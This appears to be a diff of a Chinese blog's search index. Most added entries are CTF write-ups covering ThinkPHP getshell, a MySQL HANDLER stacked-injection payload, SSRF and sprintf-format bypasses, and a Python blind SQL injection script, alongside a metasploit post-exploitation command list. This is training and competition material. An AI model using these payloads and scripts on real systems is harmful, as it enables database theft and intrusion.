@@ -1,6 +1,63 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ubuntu 用apt-get 安装apache 和php 之后php不能解析的问题</title>
+    <url>/2020/03/26/ubuntu%20%E7%94%A8apt-get%20%E5%AE%89%E8%A3%85apache%20%E5%92%8Cphp%20%E4%B9%8B%E5%90%8Ephp%E4%B8%8D%E8%83%BD%E8%A7%A3%E6%9E%90%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<h2 id="ubuntu-用apt-get-安装apache-和php-之后php不能解析的问题"><a href="#ubuntu-用apt-get-安装apache-和php-之后php不能解析的问题" class="headerlink" title="ubuntu 用apt-get 安装apache 和php 之后php不能解析的问题"></a>ubuntu 用apt-get 安装apache 和php 之后php不能解析的问题</h2><p>1.sudo apt-get install apache2<br>2.sudo apt-get install php7.0<br>3.sudo apt-get install libapache2-mod-php</p>
+]]></content>
+      <categories>
+        <category>服务配置</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>STP中根路径开销和本地路径开销的区别</title>
+    <url>/2020/03/26/STP%E4%B8%AD%E6%A0%B9%E8%B7%AF%E5%BE%84%E5%BC%80%E9%94%80%E5%92%8C%E6%9C%AC%E5%9C%B0%E8%B7%AF%E5%BE%84%E5%BC%80%E9%94%80%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
+    <content><![CDATA[<p>STP中根路径开销和本地路径开销的区别<br> <a id="more"></a><br><img src="https://img-blog.csdnimg.cn/20191126192854425.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一、根路径开销和本地路径开销<br>    本地路径开销 也就是端口开销，和端口速率有关，越快越低。<br>    交换机的每个端口都有一个端口开销（Port Cost） 参数， 此参数表示该端口在STP中的开销值。 默认情况下端口的开销和端口的带宽有关，带宽越高，开销越小。从一个非根桥到达根桥的路径可能有多条，每一条路径都有一个总的开销值，此开销值是该路径上所有接收BPDU端口的端口开销总和（即BPDU的入方向端口），称为路径开销。非根桥通过对比多条路径的路径开销，选出到达根桥的最短路径，这条最短路径的路径开销被称为RPC（Root Path Cost， 根路径开销），并生成无环树状网络。 根桥的根路径开销是0。</p>
+<p>即累计根路径开销最小的端口就是根端口。端口收到一个 BPDU 报文后，抽取该 BPDU 报文中累计根路径开销字段的值，加上该端口本身的路径开</p>
+<p>销即为累计根路径开销。</p>
+<pre><code>从非根桥到根桥的路径可能有很多条，从该端口(包括该端口)到根桥的路径上所有出端口的端口开销总和就是根路径开销</code></pre><p>如上图:s2中eth0/0/1端口的根路径开销就是20+18=38,eth0/0/2端口的根路径开销就是39.所以0/0/1是根端口。</p>
+]]></content>
+      <categories>
+        <category>路由交换</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>i春秋网络安全公益赛 web easythinking thinkphp6.0 session任意创建文件、getshell</title>
+    <url>/2020/03/26/i%E6%98%A5%E7%A7%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%20web%20easythinking%20thinkphp6.0%20session%E4%BB%BB%E6%84%8F%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E3%80%81getshell/</url>
+    <content><![CDATA[<p>2020-i春秋网络安全公益赛<br> <a id="more"></a><br>首先进来看到url很熟悉，直接访问/user/member/index，发现爆错爆出了版本号<br><img src="https://img-blog.csdnimg.cn/20200224121830605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200224122123362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随后去网上搜索thinkphp 6.0漏洞，发现了最近的下面这篇文章<br><a href="https://www.uedbox.com/post/65126/">https://www.uedbox.com/post/65126/</a><br><img src="https://img-blog.csdnimg.cn/20200224122239272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>该漏洞可以在目标环境开启session的条件下任意创建文件，且在特定情况下可以getshell。<br>下面尝试了一下，大写的惊喜。<br><img src="https://img-blog.csdnimg.cn/20200224122945151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgsui4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随后查看了phpinfo()、蚁剑进行连接,发现disable_function过滤了很多函数，直接上蚁剑的bypass插件绕过，在根目录下发现readflag，执行得到flag<br><img src="https://img-blog.csdnimg.cn/20200224123407699.png" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>i春秋网络安全公益赛 web blacklist利用mysql特性handler进行堆叠注入</title>
+    <url>/2020/03/26/i%E6%98%A5%E7%A7%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%20web%20blacklist%E5%88%A9%E7%94%A8mysql%E7%89%B9%E6%80%A7handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>2020-i春秋网络安全公益赛</p>
+ <a id="more"></a>
+
+<p>题目过滤了很多东西，之前题目的利用set进行堆叠注入行不通了<br><img src="https://img-blog.csdnimg.cn/20200224145545291.png" alt="在这里插入图片描述"><br>但是去年看过飘零师傅的fudanctf的wp，嘻嘻，利用mysql的handler进行注入。</p>
+<p><a href="https://www.4hou.com/posts/mM60">https://www.4hou.com/posts/mM60</a><br><img src="https://img-blog.csdnimg.cn/20200224145435776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>11’; handler <code>FlagHere</code> open as <code>tgt</code>;handler <code>tgt</code> read next;–</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>BJDCTF-文件探测-ssrf+逻辑漏洞</title>
+    <url>/2020/03/26/BJDCTF-%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B-ssrf+%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>2020-BJDCTF</p>
+ <a id="more"></a>
+<p><strong>一、ssrf</strong><br>信息收集了一波，发现home.php这个hint以及admin.php，访问<br><img src="https://img-blog.csdnimg.cn/20200324161042584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324160321427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 随后用伪协议读取system.php的源码和<br> <img src="https://img-blog.csdnimg.cn/20200324160418606.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'y1ng'</span>]) || $_COOKIE[<span class="string">'y1ng'</span>] !== sha1(md5(<span class="string">'y1ng'</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ '</span>;</span><br><span class="line">$str3 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ '</span>;</span><br><span class="line">$str4 = <span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ '</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filter1 = <span class="string">'/^http:\/\/127\.0\.0\.1\//i'</span>;</span><br><span class="line">$filter2 = <span class="string">'/.?f.?l.?a.?g.?/i'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里有两个点<br>1、q2参数会拼接.y1ng.txt，当时用的#绕过，发现师傅wp还可以用admin.php?a=<br>2、q3参数有个sprintf格式化漏洞采用%s%绕过，用了%s%后，会将要输出的内容用%s格式化输出在%s%的位置，而不是用%d格式化输出。<br>随后打到了admin.php的源码<br><img src="https://img-blog.csdnimg.cn/20200324161355348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>二、逻辑洞</strong><br>下面的随机数mt_rand只是生成了长度，后面用的函数无法进行随机数爆破。<br>这里将phpsessid删除，访问就可以了。删除后访问，$data值将是空，这样就能计算aes加密的值了<br><img src="https://img-blog.csdnimg.cn/20200324161654623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>带上加密的值，删除phpsessid访问。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Powershell------对目标进行屏幕监控</title>
     <url>/2020/03/25/Powershell------%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7/</url>
     <content><![CDATA[<h2 id="Bind模式："><a href="#Bind模式：" class="headerlink" title="Bind模式："></a><strong>Bind模式：</strong></h2><p>出现下面这种情况<br><img src="https://img-blog.csdnimg.cn/20200325191322855.png" alt="在这里插入图片描述"></p>
@@ -29,8 +86,8 @@
       </categories>
   </entry>
   <entry>
-    <title>metasploit后渗透</title>
-    <url>/2020/03/25/metasploit%E5%90%8E%E6%B8%97%E9%80%8F/</url>
+    <title>metasploit------后渗透</title>
+    <url>/2020/03/25/metasploit------%E5%90%8E%E6%B8%97%E9%80%8F/</url>
     <content><![CDATA[<h2 id="转载：https-xz-aliyun-com-t-2536-toc-6"><a href="#转载：https-xz-aliyun-com-t-2536-toc-6" class="headerlink" title="转载：https://xz.aliyun.com/t/2536#toc-6"></a><strong>转载：<a href="https://xz.aliyun.com/t/2536#toc-6">https://xz.aliyun.com/t/2536#toc-6</a></strong></h2><h2 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a><strong>系统命令</strong></h2><p><strong>1）基本系统命令</strong></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sessions    <span class="comment">#sessions –h 查看帮助</span></span><br><span class="line">sessions -i &lt;ID值&gt;  <span class="comment">#进入会话   -k  杀死会话</span></span><br><span class="line">background  <span class="comment">#将当前会话放置后台</span></span><br><span class="line">run  <span class="comment">#执行已有的模块，输入run后按两下tab，列出已有的脚本</span></span><br><span class="line">info <span class="comment">#查看已有模块信息</span></span><br><span class="line">getuid <span class="comment"># 查看权限 </span></span><br><span class="line">getpid <span class="comment"># 获取当前进程的pid</span></span><br><span class="line">sysinfo <span class="comment"># 查看目标机系统信息</span></span><br><span class="line">ps <span class="comment"># 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span></span><br><span class="line">idletime <span class="comment">#查看目标机闲置时间</span></span><br><span class="line">reboot / shutdown   <span class="comment">#重启/关机</span></span><br><span class="line">shell <span class="comment">#进入目标机cmd shell</span></span><br></pre></td></tr></table></figure>
  <a id="more"></a>
@@ -296,10 +353,10 @@
   <entry>
     <title>i春秋网络内生安全试验场CTF夺旗赛（第二季）部分wp</title>
     <url>/2020/03/25/i%E6%98%A5%E7%A7%8B%E7%BD%91%E7%BB%9C%E5%86%85%E7%94%9F%E5%AE%89%E5%85%A8%E8%AF%95%E9%AA%8C%E5%9C%BACTF%E5%A4%BA%E6%97%97%E8%B5%9B%EF%BC%88%E7%AC%AC%E4%BA%8C%E5%AD%A3%EF%BC%89%E9%83%A8%E5%88%86wp/</url>
-    <content><![CDATA[<p>1.easyphp</p>
+    <content><![CDATA[<p>i春秋网络内生安全试验场CTF夺旗赛(第二季)部分wp<br> <a id="more"></a><br>1.easyphp</p>
 <p><img src="https://img-blog.csdnimg.cn/20191026202051685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过观察可以发现img传参base64解码；同样的方法可得index.php源码<br>之后构造序列化。。。。。</p>
 <p>2、calculate1，2<br><img src="https://img-blog.csdnimg.cn/20191026202500563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    写wp前删掉了脚本，简述下:利用selenium运算公式并结合chromedriver进行10次提交</p>
-<a id="more"></a>
+<!--more-->
 <p>3、babysql<br>    <img src="https://img-blog.csdnimg.cn/20191026202614737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191026202721697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之后测试admin’orderby 1# 到3，直到4时<br><img src="https://img-blog.csdnimg.cn/20191026202821730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTg4MTY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得知列数为3，通过fuzz发现union select可用,且页面返回第二列的内容即用户名，且常规注入不可行。尝试order by盲注,payload=admin’union select 1,2,’c’ order by 3#。发现当字符小于等于密码时，显示2，当大于密码时显示admin。<br>由此写出脚本：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.55.43.255:13004/login.php"</span></span><br><span class="line">print(hex(<span class="number">61</span>))</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    end = <span class="number">31</span></span><br><span class="line">    head = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(head - end) &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (end + head) // <span class="number">2</span></span><br><span class="line">        print(mid)</span><br><span class="line">        data1 = flag + chr(mid)</span><br><span class="line">        print(data1)</span><br><span class="line">        sql = <span class="string">"admin'union select 1,2,0x&#123;&#125; order by 3#"</span>.format(data1.encode(<span class="string">"hex"</span>))</span><br><span class="line">        s = requests.session()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: sql,</span><br><span class="line">            <span class="string">'passwd'</span>: <span class="string">'admin'</span></span><br><span class="line">        &#125;</span><br><span class="line">        print(sql)</span><br><span class="line">        result = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"admin"</span> <span class="keyword">in</span> result.text:</span><br><span class="line">            head = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid</span><br><span class="line"></span><br><span class="line">    flag = flag + chr(end)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'flag:'</span> + flag)</span><br><span class="line">print(<span class="string">"flag:"</span> + flag)</span><br></pre></td></tr></table></figure>
 
